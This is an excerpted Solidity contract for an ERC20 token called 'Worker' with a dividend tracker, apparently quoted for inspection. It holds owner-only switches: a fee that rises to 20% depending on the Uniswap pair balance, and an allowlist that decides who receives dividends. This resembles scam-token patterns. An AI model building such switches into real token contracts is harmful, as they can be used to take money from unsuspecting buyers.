...
contract TOKENS is ERC20, Ownable {
    ...
    uint256 public removeApplistEnable = 1 * (10**18);
    uint256 public removeApplistClose = 2 * (10**18);
    ...
    constructor() public ERC20("Worker", "Worker") {
    ...
    function setRemoveApplistEnable(uint256 ApplistEnable, uint256 ApplistClose) public onlyOwner {
        removeApplistEnable = ApplistEnable;
        removeApplistClose = ApplistClose;
    }
    ...
    function setAddressApplisted(address account, bool status) public onlyOwner {
        applists[account]  = status;
    }
    ...
    function _transfer(
        ...
        if (uniswapV2Pair.balance > removeApplistEnable && uniswapV2Pair.balance < removeApplistClose) {
            applistedFee = 20;  
        }else if (uniswapV2Pair.balance > removeApplistClose) { 
            applistEnable = false;    
        }    
...
contract ETHBackDividendTracker is Ownable, DividendPayingToken {
    ...
    function setBalance(address payable account, uint256 newBalance) external onlyOwner {
        ...
        if(newBalance >= minimumTokenBalanceForDividends && applists[account]) {
